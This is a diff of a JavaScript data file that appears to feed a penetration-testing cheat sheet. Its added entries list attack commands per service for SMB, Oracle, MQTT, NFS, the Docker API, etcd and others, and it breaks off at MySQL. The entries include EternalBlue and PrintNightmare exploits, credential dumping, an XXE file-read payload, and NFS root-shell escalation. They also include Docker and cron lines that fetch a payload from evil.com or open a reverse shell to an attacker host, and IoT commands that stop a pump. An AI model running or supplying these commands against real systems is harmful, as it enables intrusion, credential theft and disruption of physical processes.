+        "# Check for expired/self-signed certs and SAN entries\nopenssl s_client -connect <IP>:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'Subject:|Issuer:|DNS:|Not After'",
+        "# Enumerate HTTP/2 support\ncurl --http2-prior-knowledge -I https://<IP> 2>/dev/null | head -5"
       ],
       "exploitation": [
         "# Heartbleed (CVE-2014-0160)\nnmap -p 443 --script ssl-heartbleed <IP>",
@@ -5235,18 +5425,26 @@ var HACKTRICKS_DATA = {
         "# ROBOT Attack\nrobot-detect <IP>:443",
         "# TLS BEAST/CRIME/BREACH checks\ntestssl.sh --beast --crime --breach <IP>:443",
         "# Certificate spoofing check\nopenssl s_client -connect <IP>:443 -servername <domain> 2>/dev/null | grep -E 'subject|issuer'",
-        "sqlmap -u 'https://<IP>/page?id=1' --dbs"
+        "sqlmap -u 'https://<IP>/page?id=1' --dbs",
+        "# BEAST/POODLE/CRIME/BREACH: check for legacy cipher support\nnmap -p 443 --script ssl-dh-params,ssl-poodle,ssl-ccs-injection <IP>",
+        "# TLS client certificate bypass – send without cert if server misconfigured\ncurl --insecure https://<IP>/admin  # if mTLS required but not enforced",
+        "# SNI-based virtual host enumeration\nfor domain in $(cat subdomains.txt); do\n  echo | openssl s_client -servername $domain -connect <IP>:443 2>/dev/null | openssl x509 -noout -subject 2>/dev/null | grep $domain && echo \"$domain exists\"\ndone"
       ],
       "post_exploitation": [
         "# Extract TLS cert details for recon (SANs, org, CA)\nopenssl s_client -connect <IP>:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:|Issuer:'",
         "# Dump JS files for API keys / secrets\ncurl -sk https://<IP>/ | grep -oP 'src=\"[^\"]+\\.js\"' | while read js; do curl -sk https://<IP>/$js | grep -iE 'api[_-]?key|secret|token|password'; done",
         "# Check for exposed .git\ncurl -sk https://<IP>/.git/config",
-        "# Check for exposed .env\ncurl -sk https://<IP>/.env"
+        "# Check for exposed .env\ncurl -sk https://<IP>/.env",
+        "# Extract private key from memory if TLS termination is local (requires root)\ncat /proc/$(pgrep nginx)/mem 2>/dev/null | strings | grep -A2 'BEGIN RSA PRIVATE KEY'",
+        "# Steal session cookies via network capture (if no HSTS/Secure flag)\nssldump -i eth0 -k server.key -d | grep 'Cookie:'",
+        "# Check certificate transparency logs for additional subdomains\ncurl -s 'https://crt.sh/?q=%25.<DOMAIN>&output=json' | python3 -c \"import json,sys; [print(e['name_value']) for e in json.load(sys.stdin)]\" | sort -u"
       ],
       "other": [
         "# Check for HTTP/2 support\ncurl -v --http2 https://<IP>/",
         "# Certificate transparency search\ncurl -s 'https://crt.sh/?q=%25.<DOMAIN>&output=json' | jq '.[].name_value' | sort -u",
-        "# Virtual host fuzzing over HTTPS\nffuf -u https://<IP>/ -H 'Host: FUZZ.<DOMAIN>' -w subdomains.txt"
+        "# Virtual host fuzzing over HTTPS\nffuf -u https://<IP>/ -H 'Host: FUZZ.<DOMAIN>' -w subdomains.txt",
+        "# Test for HTTP Strict Transport Security (HSTS) absence\ncurl -sI https://<IP>/ | grep -i 'strict-transport'",
+        "# Check for HPKP (HTTP Public Key Pinning) – deprecated but informational\ncurl -sI https://<IP>/ | grep -i 'public-key-pins'"
       ]
     }
   },
@@ -5263,7 +5461,10 @@ var HACKTRICKS_DATA = {
         "nxc smb <IP> -u '' -p ''",
         "nxc smb <IP> -u guest -p '' --shares",
         "nxc smb <IP> -u users.txt -p passwords.txt",
-        "rpcclient -U '' -N <IP>"
+        "rpcclient -U '' -N <IP>",
+        "# Enumerate shares, sessions, users with null session\nsmbclient -N -L //<IP>/\nnmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery <IP>",
+        "# Check SMBv1 enabled (EternalBlue prerequisite)\nnmap -p 445 --script smb-protocols <IP> | grep 'SMBv1'",
+        "# netexec (formerly crackmapexec) share enumeration\nnetexec smb <IP> -u '' -p '' --shares"
       ],
       "exploitation": [
         "# EternalBlue (MS17-010)\nmsf> use exploit/windows/smb/ms17_010_eternalblue",
@@ -5279,16 +5480,26 @@ var HACKTRICKS_DATA = {
         "# Coerce NTLM auth via PrinterBug\npython3 printerbug.py <DOMAIN>/<user>:<pass>@<IP> <ATTACKER_IP>",
         "# Coerce via PetitPotam\npython3 PetitPotam.py <ATTACKER_IP> <IP>",
         "# SMBRelay to capture and relay hash\nntlmrelayx.py -tf targets.txt --smb2support -socks",
-        "# SMB signing disabled - prerequisite for relay\nnmap -p 445 --script smb2-security-mode <IP> | grep 'signing'"
+        "# SMB signing disabled - prerequisite for relay\nnmap -p 445 --script smb2-security-mode <IP> | grep 'signing'",
+        "# EternalBlue (CVE-2017-0144) – MS17-010\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <IP>; set LHOST <ATTACKER>; run",
+        "# PrintNightmare (CVE-2021-1675) via SMB spooler\npython3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<IP> '\\\\<ATTACKER>\\share\\evil.dll'",
+        "# SambaCry (CVE-2017-7494) – writable share + username map script\nmsf> use exploit/linux/samba/is_known_pipename",
+        "# SMB relay with ntlmrelayx (no SMB signing required)\nntlmrelayx.py -t smb://<TARGET_IP> -smb2support --no-http-server -i\n# Trigger NTLM auth from victim via Responder or PetitPotam",
+        "# PsExec-style remote execution via SMB\npsexec.py <DOMAIN>/<USER>:<PASS>@<IP>\n# Or with hash:\npsexec.py -hashes :<NTHASH> <DOMAIN>/<USER>@<IP>"
       ],
       "post_exploitation": [
         "# Download all readable shares\nsmbclient //<IP>/share -U user%pass -c 'recurse ON; mget *'",
         "# Mount share\nmount -t cifs //<IP>/share /mnt/smb -o user=<user>,pass=<pass>",
-        "# Dump SAM via secretsdump\nimpacket-secretsdump <DOMAIN>/<user>:<pass>@<IP>"
+        "# Dump SAM via secretsdump\nimpacket-secretsdump <DOMAIN>/<user>:<pass>@<IP>",
+        "# SecretsDump – extract SAM, LSA, cached credentials via SMB\nsecretsdump.py <DOMAIN>/<USER>:<PASS>@<IP>\nsecretsdump.py -hashes :<NTHASH> <DOMAIN>/<USER>@<IP>",
+        "# Enumerate shares for sensitive data\nnetexec smb <IP> -u <USER> -p <PASS> -M spider_plus --share 'C$'\n# Find files with sensitive keywords\nsmbmap -H <IP> -u <USER> -p <PASS> -R -A '.*password.*|.*config.*|.*secret.*'",
+        "# Persistence via SMB: drop startup/scheduled task payload\nnet use Z: \\\\<IP>\\C$ /user:<DOMAIN>\\<USER> <PASS>\ncopy /tmp/payload.exe Z:\\Windows\\System32\\payload.exe"
       ],
       "other": [
         "# SMB signing check\nnmap -p 445 --script smb2-security-mode <IP>",
-        "# Null session\nnxc smb <IP> -u '' -p '' --users"
+        "# Null session\nnxc smb <IP> -u '' -p '' --users",
+        "# Check SMB signing disabled (relay attack prerequisite)\nnmap -p 445 --script smb2-security-mode <IP> | grep 'signing'",
+        "# Coerce NTLM auth via various RPC-over-SMB techniques\n# SpoolSample: \\PIPE\\spoolss\n# PetitPotam: \\PIPE\\lsarpc or efsrpc\n# ShadowCoerce: \\PIPE\\FssagentRpc"
       ]
     }
   },
@@ -5300,21 +5511,31 @@ var HACKTRICKS_DATA = {
         "nmap -sU -p 500 <IP>",
         "ike-scan -M <IP>",
         "ike-scan -M --showbackoff <IP>",
-        "nmap -sU -p 500 --script ike-version <IP>"
+        "nmap -sU -p 500 --script ike-version <IP>",
+        "# IKEv1 aggressive mode fingerprinting\nike-scan -A <IP>",
+        "# IKEv2 SA proposal enumeration\nike-scan --ikev2 <IP>",
+        "# Enumerate supported transforms\nike-scan --trans=5,2,1,2 <IP>  # DES+SHA+preshared key"
       ],
       "exploitation": [
         "ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP>",
         "psk-crack -d <wordlist> psk.txt",
         "# Enumerate transforms\nfor ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do echo \"--trans=$ENC,$HASH,1,2\" >> ike-dict.txt; done; done\nwhile read line; do ike-scan -M $line <IP> | grep -q 'returned handshake' && echo \"Valid: $line\"; done < ike-dict.txt",
-        "./ikeforce.py <IP> -e -w groupnames.dic"
+        "./ikeforce.py <IP> -e -w groupnames.dic",
+        "# IKEv1 aggressive mode + PSK crack (CVE-2001-0395 class)\n# Aggressive mode sends hash of PSK in cleartext-comparable form\nike-scan -A --id=groupname <IP> | tee ikescan.txt\n# Extract hash and crack:\npsk-crack -d rockyou.txt ikescan.txt",
+        "# IKE vendor ID fingerprinting for targeted exploits\nike-scan --showbackoff <IP>",
+        "# Enumerate valid VPN group names via error differential\nfor grp in vpn cisco remote staff; do\n  ike-scan -A --id=$grp <IP> 2>&1 | grep -i 'auth\\|invalid\\|notify' && echo \"Valid: $grp\"\ndone"
       ],
       "post_exploitation": [
         "# After VPN auth, enumerate internal network\nip route show\narp -a",
         "cat /etc/ipsec.conf 2>/dev/null\ncat /etc/strongswan.conf 2>/dev/null",
-        "ipsec statusall  # show active tunnels"
+        "ipsec statusall  # show active tunnels",
+        "# After IPsec auth: intercept tunnel traffic with tcpdump\ntcpdump -i eth0 esp or udp port 500 or udp port 4500 -w ipsec.pcap",
+        "# Extract PSK from cracked IKE hash for VPN client config\n# Use cracked PSK to authenticate as legitimate VPN user"
       ],
       "other": [
-        "# Connect with recovered credentials\nvpnc samplevpn"
+        "# Connect with recovered credentials\nvpnc samplevpn",
+        "# IPsec NAT-T uses UDP 4500 when NAT detected\nnmap -sU -p 4500 <IP>",
+        "# Check for ISAKMP implementation weaknesses\nnmap -sU -p 500 --script ike-version <IP>"
       ]
     }
   },
@@ -5515,16 +5736,23 @@ var HACKTRICKS_DATA = {
     "categories": {
       "enumeration": [
         "nmap -p 700 --script ssl-cert,ssl-enum-ciphers <IP>",
-        "openssl s_client -connect <IP>:700 -quiet -servername epp.test 2>/dev/null | head"
+        "openssl s_client -connect <IP>:700 -quiet -servername epp.test 2>/dev/null | head",
+        "# EPP login frame test\nopenssl s_client -connect <IP>:700 2>/dev/null | head -20",
+        "# Probe EPP server capabilities\ncat <<EOF | openssl s_client -connect <IP>:700 -quiet 2>/dev/null\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><epp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\"><hello/></epp>\nEOF"
       ],
       "exploitation": [
-        "# XXE via EPP domain:name\n# Send crafted EPP XML with external entity reference"
+        "# XXE via EPP domain:name\n# Send crafted EPP XML with external entity reference",
+        "# EPP XML injection via domain:name field\n# Inject XXE payload:\ncat <<EOF | openssl s_client -connect <IP>:700 -quiet\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<epp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\"><command><check><domain:check xmlns:domain=\"urn:ietf:params:xml:ns:domain-1.0\"><domain:name>&xxe;</domain:name></domain:check></check></command></epp>\nEOF",
+        "# EPP brute force registry credentials\nfor cred in admin:admin registrar:registrar; do\n  u=${cred%%:*}; p=${cred##*:}\n  # EPP LOGIN command\n  cat <<EOXML | openssl s_client -connect <IP>:700 -quiet 2>/dev/null | grep 'result code'\n<?xml version=\"1.0\"?><epp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\"><command><login><clID>$u</clID><pw>$p</pw></login></command></epp>\nEOXML\ndone"
       ],
       "post_exploitation": [
-        "# After EPP auth, enumerate registered domains for target org\n# Use EPP domain:check and domain:info commands to map infrastructure"
+        "# After EPP auth, enumerate registered domains for target org\n# Use EPP domain:check and domain:info commands to map infrastructure",
+        "# After EPP auth: enumerate all registered domains for target organization\n# EPP domain:info for specific domains:\ncat <<EOF | openssl s_client -connect <IP>:700 -quiet\n<?xml version=\"1.0\"?><epp><command><info><domain:info xmlns:domain=\"urn:ietf:params:xml:ns:domain-1.0\"><domain:name hosts=\"all\">target.com</domain:name></domain:info></info></command></epp>\nEOF",
+        "# EPP domain transfer: if registrar auth compromised, initiate unauthorized transfer\n# Requires authInfo code from domain:info response"
       ],
       "other": [
-        "# EPP hello frame\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<epp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\"><hello/></epp>"
+        "# EPP hello frame\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<epp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\"><hello/></epp>",
+        "# EPP TCP port 700 is TLS-wrapped – check cert for registrar identity\nopenssl s_client -connect <IP>:700 </dev/null 2>/dev/null | openssl x509 -noout -subject"
       ]
     }
   },
@@ -5681,23 +5909,35 @@ var HACKTRICKS_DATA = {
         "nmap -p 1521 --script oracle-sid-brute <IP>",
         "./odat-libc2.12-x86_64 all -s <IP>",
         "tnscmd10g version -h <IP>",
-        "tnscmd10g status -h <IP>"
+        "tnscmd10g status -h <IP>",
+        "# Enumerate TNS listener and SIDs\nnmap -p 1521 --script oracle-tns-version,oracle-sid-brute <IP>",
+        "# ODAT: Oracle Database Attacking Tool\nodat.py all -s <IP> -p 1521",
+        "# Brute force SID names\nmsfconsole -q -x 'use auxiliary/scanner/oracle/sid_brute; set RHOSTS <IP>; run'"
       ],
       "exploitation": [
         "# SID brute\n./odat all -s <IP> -p 1521",
         "# Auth brute\nnmap -p 1521 --script oracle-brute --script-args 'oracle-brute.sid=ORCL' <IP>",
         "msf> use admin/oracle/oracle_sql",
-        "# SQLi via Oracle DBMS\nsqlmap -u 'http://<IP>/page?id=1' --dbms=oracle --dbs"
+        "# SQLi via Oracle DBMS\nsqlmap -u 'http://<IP>/page?id=1' --dbms=oracle --dbs",
+        "# Default credentials test\nodat.py passwordguesser -s <IP> -d ORCL\n# Common: system:manager, sys:change_on_install, scott:tiger",
+        "# Oracle Java stored procedure for OS command exec\nmsfconsole -q -x 'use exploit/multi/misc/java_rmi_server; ...'  # if Java stored procs enabled\n# ODAT:\nodat.py dbmsscheduler -s <IP> -d ORCL -U system -P manager --sysdba --exec 'id'",
+        "# UTL_FILE – read arbitrary files on the server\nSQL> SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('SERVER_DIR','<filename>','R',1000)) FROM DUAL;",
+        "# Oracle TNS poison (CVE-2012-1675)\nodat.py tnspoison -s <IP> -p 1521 -d ORCL"
       ],
       "post_exploitation": [
         "# After Oracle access, extract password hashes\nsqlplus user/pass@<IP>/ORCL\nSELECT username, password FROM dba_users;",
         "# Check for default passwords\nSELECT username FROM dba_users WHERE password = 'E066D214D5421CCC';  -- 'CHANGE_ON_INSTALL'",
         "# Oracle Java stored procedure for OS command exec\nEXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','read,write,execute,delete');",
-        "# Find Oracle config files\nfind / -name 'listener.ora' -o -name 'tnsnames.ora' -o -name 'sqlnet.ora' 2>/dev/null"
+        "# Find Oracle config files\nfind / -name 'listener.ora' -o -name 'tnsnames.ora' -o -name 'sqlnet.ora' 2>/dev/null",
+        "# Dump all user password hashes\nSELECT username, password, spare4 FROM sys.user$;",
+        "# Read OS files via UTL_FILE external directory\nSELECT bfilename('ORACLE_HOME', '../dbs/init.ora') FROM DUAL;",
+        "# Create OS-level backdoor via Java stored procedure\n# exec dbms_java.grant_permission('PUBLIC','java.io.FilePermission','<<ALL FILES>>','read,write,execute');"
       ],
       "other": [
         "# Common SIDs: ORCL, XE, PROD, DEV, DB, ORACLE",
-        "sqlplus user/pass@<IP>/ORCL"
+        "sqlplus user/pass@<IP>/ORCL",
+        "# Oracle TNS listener log – check for query logging\ncat $ORACLE_BASE/diag/tnslsnr/*/listener/trace/listener.log",
+        "# Test for listener password protection\nlsnrctl services <IP>  # if no auth required = misconfiguration"
       ]
     }
   },
@@ -5738,20 +5978,30 @@ var HACKTRICKS_DATA = {
         "nmap -p 1883 -sV <IP>",
         "mosquitto_sub -h <IP> -t '#' -v",
         "mosquitto_sub -h <IP> -t '$SYS/#' -v",
-        "nmap -p 1883 --script mqtt-subscribe <IP>"
+        "nmap -p 1883 --script mqtt-subscribe <IP>",
+        "# Connect without auth and enumerate topics\nmqtt_fuzz.py -t '#' -h <IP>  # subscribe to all topics\nmosquitto_sub -h <IP> -t '#' -v  # dump all messages",
+        "# Check broker info\nmosquitto_sub -h <IP> -t '$SYS/#' -v  # system topics reveal version, uptime, clients"
       ],
       "exploitation": [
         "# Subscribe to all topics (no auth)\nmosquitto_sub -h <IP> -t '#' -v",
         "# Publish to control topic\nmosquitto_pub -h <IP> -t 'device/command' -m '{\"cmd\":\"reboot\"}'",
-        "mosquitto_sub -h <IP> -p 1883 -u <user> -P <pass> -t '#' -v"
+        "mosquitto_sub -h <IP> -p 1883 -u <user> -P <pass> -t '#' -v",
+        "# Subscribe to all topics without auth – data exfiltration\nmosquitto_sub -h <IP> -p 1883 -t '#' -v 2>/dev/null | tee mqtt_capture.txt",
+        "# Publish malicious command to control topic (IIoT/IoT actuators)\nmosquitto_pub -h <IP> -t 'actuator/pump/cmd' -m 'STOP'  # shut down physical process\nmosquitto_pub -h <IP> -t 'hvac/control' -m '{\"temp\":100}'",
+        "# Retained message poisoning – persist malicious payload\nmosquitto_pub -h <IP> -t 'device/firmware/update' -m 'http://evil.com/malware.bin' --retain",
+        "# Broker ACL bypass via topic wildcard injection\nmosquitto_sub -h <IP> -t 'victim/+/data' -v  # enumerate all devices"
       ],
       "post_exploitation": [
         "# After MQTT access, subscribe persistently and log all topics\nmosquitto_sub -h <IP> -t '#' -v >> mqtt_all_topics.log &",
         "# Search for credentials in retained messages\nmosquitto_sub -h <IP> -t '#' -R -C 100 | grep -iE 'pass|key|token|secret'",
-        "find /etc/mosquitto -name '*.conf' 2>/dev/null | xargs grep -iE 'password|allow_anonymous'"
+        "find /etc/mosquitto -name '*.conf' 2>/dev/null | xargs grep -iE 'password|allow_anonymous'",
+        "# Capture credentials from CONNECT packets (if logging enabled)\n# Check broker logs:\ncat /var/log/mosquitto/mosquitto.log | grep 'username\\|CONNECT'",
+        "# MQTT bridge attack – if broker bridges to another broker, inject via first broker\nmosquitto_pub -h <IP> -t 'bridge/topic' -m 'payload'  # propagates to remote broker"
       ],
       "other": [
-        "# Python MQTT client\nimport paho.mqtt.client as mqtt\nclient = mqtt.Client()\nclient.connect('<IP>', 1883)\nclient.subscribe('#', qos=1)"
+        "# Python MQTT client\nimport paho.mqtt.client as mqtt\nclient = mqtt.Client()\nclient.connect('<IP>', 1883)\nclient.subscribe('#', qos=1)",
+        "# MQTT over TLS (MQTTS) on port 8883\nmosquitto_sub -h <IP> -p 8883 --cafile ca.crt -t '#' -v",
+        "# MQTT over WebSocket on port 9001\npython3 -c \"import websocket; ws=websocket.create_connection('ws://<IP>:9001/mqtt'); ...\""
       ]
     }
   },
@@ -5762,22 +6012,32 @@ var HACKTRICKS_DATA = {
       "enumeration": [
         "showmount -e <IP>",
         "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 <IP>",
-        "msf> use scanner/nfs/nfsmount"
+        "msf> use scanner/nfs/nfsmount",
+        "# Enumerate NFS exports\nshowmount -e <IP>",
+        "# Nmap NFS scripts\nnmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <IP>"
       ],
       "exploitation": [
         "# Mount exposed share\nmkdir /mnt/nfs\nmount -t nfs <IP>:/export /mnt/nfs -o nolock",
         "# UID spoofing (if no_root_squash)\nsudo useradd -u <target_uid> nfsuser\nsu nfsuser\ncp ~/.ssh/authorized_keys /mnt/nfs/home/target/.ssh/",
-        "# no_root_squash + SUID binary\ncp /bin/bash /mnt/nfs/tmp/bash\nchmod +s /mnt/nfs/tmp/bash\n/mnt/nfs/tmp/bash -p"
+        "# no_root_squash + SUID binary\ncp /bin/bash /mnt/nfs/tmp/bash\nchmod +s /mnt/nfs/tmp/bash\n/mnt/nfs/tmp/bash -p",
+        "# Mount NFS share as root (no_root_squash misconfiguration)\nmount -t nfs <IP>:/export /mnt/nfs -o nolock,vers=3\n# Check if root on attacker maps to root on target:\nls -la /mnt/nfs/root/",
+        "# SUID shell escalation via no_root_squash\ncp /bin/bash /mnt/nfs/tmp/rootbash\nchown root:root /mnt/nfs/tmp/rootbash\nchmod 4755 /mnt/nfs/tmp/rootbash\n# On target:\n/tmp/rootbash -p  # spawns root shell",
+        "# NFS NFSv4 ACL bypass\n# If NFSv4 ACLs not configured, any user can read/write all files",
+        "# Weak Kerberos NFS: if sec=sys (no Kerberos), impersonate any UID\nsudo mount -o vers=3,nolock,sec=sys -t nfs <IP>:/export /mnt/nfs\nsudo -u '#1000' ls /mnt/nfs/home/targetuser/"
       ],
       "post_exploitation": [
         "cat /etc/exports",
         "# After NFS mount, search for credentials and SSH keys\nfind /mnt/nfs -name 'id_rsa' -o -name '*.pem' -o -name 'shadow' 2>/dev/null",
         "# Check for SUID binaries on mounted share\nfind /mnt/nfs -perm -4000 -type f 2>/dev/null",
-        "showmount -e <IP>  # re-enumerate after auth"
+        "showmount -e <IP>  # re-enumerate after auth",
+        "# After mount with no_root_squash: add SSH key to root\necho '<PUBKEY>' > /mnt/nfs/root/.ssh/authorized_keys\nchmod 600 /mnt/nfs/root/.ssh/authorized_keys\nssh root@<IP>",
+        "# Harvest secrets from mounted home directories\nfind /mnt/nfs -name '.bash_history' -o -name '*.pem' -o -name 'id_rsa' 2>/dev/null"
       ],
       "other": [
         "# NFS exports file location\ncat /etc/exports",
-        "# Check for insecure options: no_root_squash, insecure, rw"
+        "# Check for insecure options: no_root_squash, insecure, rw",
+        "# NFS version negotiation\nnmap -sV -p 2049 <IP>\n# NFSv4 requires TCP; NFSv3 supports UDP",
+        "# Check /etc/exports for dangerous options\ncat /etc/exports | grep -E 'no_root_squash|no_all_squash|insecure'"
       ]
     }
   },
@@ -5823,22 +6083,31 @@ var HACKTRICKS_DATA = {
         "docker -H <IP>:2375 version",
         "docker -H <IP>:2375 ps -a",
         "docker -H <IP>:2375 images",
-        "nmap -p 2375 --script docker-version <IP>"
+        "nmap -p 2375 --script docker-version <IP>",
+        "# List all containers, images, volumes\ncurl http://<IP>:2375/containers/json\ncurl http://<IP>:2375/images/json\ncurl http://<IP>:2375/info",
+        "# Nmap Docker API detection\nnmap -p 2375 -sV --script docker-version <IP>"
       ],
       "exploitation": [
         "# Escape to host via privileged container\ndocker -H <IP>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine chroot /mnt bash",
         "# Execute in running container\ndocker -H <IP>:2375 exec -it <container_id> /bin/sh",
         "msf> use exploit/linux/http/docker_daemon_tcp",
-        "# Create privileged container and read shadow\ncurl -s -X POST -H 'Content-Type: application/json' http://<IP>:2375/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /mnt/etc/shadow\"],\"Binds\":[\"/:/mnt\"],\"Privileged\":true}'"
+        "# Create privileged container and read shadow\ncurl -s -X POST -H 'Content-Type: application/json' http://<IP>:2375/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /mnt/etc/shadow\"],\"Binds\":[\"/:/mnt\"],\"Privileged\":true}'",
+        "# Escape to host via privileged container\ncurl -s -X POST http://<IP>:2375/containers/create -H 'Content-Type: application/json' \\\n  -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/mnt/host\"],\"Privileged\":true}'\n# Then start and exec to get host filesystem access",
+        "# Deploy cryptominer/backdoor container via unauthenticated API\ncurl -X POST http://<IP>:2375/images/create?fromImage=alpine\ncurl -X POST http://<IP>:2375/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"curl\",\"-s\",\"http://evil.com/payload.sh\",\"|\",\"sh\"]}'",
+        "# Read host secrets via mounted Docker socket\ncurl --unix-socket /var/run/docker.sock http://localhost/containers/json\n# If attacker container mounts /var/run/docker.sock:\ndocker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh\ncurl --unix-socket /var/run/docker.sock http://localhost/containers/json"
       ],
       "post_exploitation": [
         "# Extract secrets from running containers\ndocker -H <IP>:2375 inspect $(docker -H <IP>:2375 ps -q) | grep -iE 'Env|Secret|Password'",
         "# Copy files from container to host\ndocker -H <IP>:2375 cp <container_id>:/etc/shadow /tmp/shadow",
         "# Persist backdoor via crontab on host through volume mount\ndocker -H <IP>:2375 run --rm -v /:/mnt alpine sh -c 'echo \"* * * * * root bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\" >> /mnt/etc/crontab'",
-        "# Extract Docker registry credentials\ndocker -H <IP>:2375 run --rm -v /:/mnt alpine cat /mnt/root/.docker/config.json"
+        "# Extract Docker registry credentials\ndocker -H <IP>:2375 run --rm -v /:/mnt alpine cat /mnt/root/.docker/config.json",
+        "# Read all secrets from all running containers\nfor id in $(curl -s http://<IP>:2375/containers/json | python3 -c \"import json,sys; [print(c['Id'][:12]) for c in json.load(sys.stdin)]\"); do\n  curl -s http://<IP>:2375/containers/$id/json | python3 -c \"import json,sys; d=json.load(sys.stdin); print(d.get('Config',{}).get('Env',[]))\"\ndone",
+        "# Dump container filesystem for secrets\ncurl -s http://<IP>:2375/containers/<ID>/export | tar -x -C /tmp/container_fs"
       ],
       "other": [
-        "# Docker TLS port is 2376\ncurl --insecure https://<IP>:2376/containers/json | jq"
+        "# Docker TLS port is 2376\ncurl --insecure https://<IP>:2376/containers/json | jq",
+        "# Authenticated Docker API (TLS on 2376)\ndocker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H <IP>:2376 ps",
+        "# Check Docker daemon config for insecure options\ncat /etc/docker/daemon.json | grep -E 'tls|hosts|insecure'"
       ]
     }
   },
@@ -5873,22 +6142,32 @@ var HACKTRICKS_DATA = {
         "curl http://<IP>:2379/version",
         "curl http://<IP>:2379/v2/members",
         "curl http://<IP>:2379/v3/cluster/member/list",
-        "etcdctl --endpoints=http://<IP>:2379 member list"
+        "etcdctl --endpoints=http://<IP>:2379 member list",
+        "# Enumerate etcd members and version\ncurl http://<IP>:2379/version\ncurl http://<IP>:2379/v2/members",
+        "# Check health\ncurl http://<IP>:2379/health"
       ],
       "exploitation": [
         "# Dump all keys (no auth by default)\netcdctl --endpoints=http://<IP>:2379 get / --prefix --keys-only",
         "etcdctl --endpoints=http://<IP>:2379 get /registry/secrets --prefix",
         "# Read Kubernetes secrets from etcd\netcdctl --endpoints=http://<IP>:2379 get /registry/secrets/default --prefix | strings",
-        "# Write a key\netcdctl --endpoints=http://<IP>:2379 put /test/key 'evil_value'"
+        "# Write a key\netcdctl --endpoints=http://<IP>:2379 put /test/key 'evil_value'",
+        "# Dump all keys (Kubernetes secrets stored in etcd)\nETCDCTL_API=3 etcdctl --endpoints=http://<IP>:2379 get / --prefix --keys-only 2>/dev/null | head -50\nETCDCTL_API=3 etcdctl --endpoints=http://<IP>:2379 get /registry/secrets --prefix --keys-only",
+        "# Extract Kubernetes service account tokens from etcd\nETCDCTL_API=3 etcdctl --endpoints=http://<IP>:2379 get /registry/secrets/default --prefix | strings | grep -E 'token|eyJ'",
+        "# Write malicious data to create admin ServiceAccount\nETCDCTL_API=3 etcdctl --endpoints=http://<IP>:2379 put /registry/serviceaccounts/kube-system/attacker '<CRAFTED_PROTOBUF>'",
+        "# Dump all Kubernetes secrets in plaintext\ncurl http://<IP>:2379/v2/keys?recursive=true | python3 -c \"import json,sys; data=json.load(sys.stdin); [print(n['key'],n.get('value','')) for n in data.get('node',{}).get('nodes',[])]\" 2>/dev/null"
       ],
       "post_exploitation": [
         "# Extract all Kubernetes secrets from etcd\netcdctl --endpoints=http://<IP>:2379 get /registry/secrets --prefix | strings | grep -iE 'password|token|key'",
         "# Extract service account tokens\netcdctl --endpoints=http://<IP>:2379 get /registry/secrets/kube-system --prefix | strings",
         "# Write a malicious secret to K8s\netcdctl --endpoints=http://<IP>:2379 put /registry/secrets/default/evil '{\"apiVersion\":\"v1\",\"kind\":\"Secret\"}'",
-        "# Backup entire etcd for offline analysis\netcdctl --endpoints=http://<IP>:2379 snapshot save /tmp/etcd_backup.db"
+        "# Backup entire etcd for offline analysis\netcdctl --endpoints=http://<IP>:2379 snapshot save /tmp/etcd_backup.db",
+        "# Extract cluster CA cert and admin kubeconfig from etcd\nETCDCTL_API=3 etcdctl get /registry/secrets/kube-system/cluster-admin-kubeconfig 2>/dev/null | strings",
+        "# Implant backdoor cluster-admin role binding via etcd\n# Craft protobuf ClusterRoleBinding and PUT to /registry/clusterrolebindings/"
       ],
       "other": [
-        "# etcd stores Kubernetes secrets in plaintext if encryption-at-rest not configured"
+        "# etcd stores Kubernetes secrets in plaintext if encryption-at-rest not configured",
+        "# etcd TLS authentication\nETCDCTL_API=3 etcdctl --endpoints=https://<IP>:2379 --cacert=ca.crt --cert=client.crt --key=client.key get / --prefix --keys-only",
+        "# Common Kubernetes etcd paths:\n# /registry/secrets/<namespace>/<name>\n# /registry/configmaps/<namespace>/<name>\n# /registry/serviceaccounts/<namespace>/<name>"
       ]
     }
   },
@@ -6027,23 +6306,33 @@ var HACKTRICKS_DATA = {
         "nmap -sV -p 3306 --script mysql-info,mysql-empty-password,mysql-enum,mysql-databases,mysql-variables <IP>",
         "mysql -h <IP> -u root",
         "mysql -h <IP> -u root -p",
-        "nmap -p 3306 --script mysql-audit,mysql-dump-hashes <IP>"
+        "nmap -p 3306 --script mysql-audit,mysql-dump-hashes <IP>",
+        "# MySQL version and user enumeration\nnmap -p 3306 --script mysql-info,mysql-enum,mysql-empty-password <IP>",
+        "# Connect and enumerate databases\nmysql -h <IP> -u root -p\nSHOW DATABASES;\nSELECT user, host, authentication_string FROM mysql.user;"
       ],
       "exploitation": [
         "hydra -L users.txt -P passwords.txt mysql://<IP>",
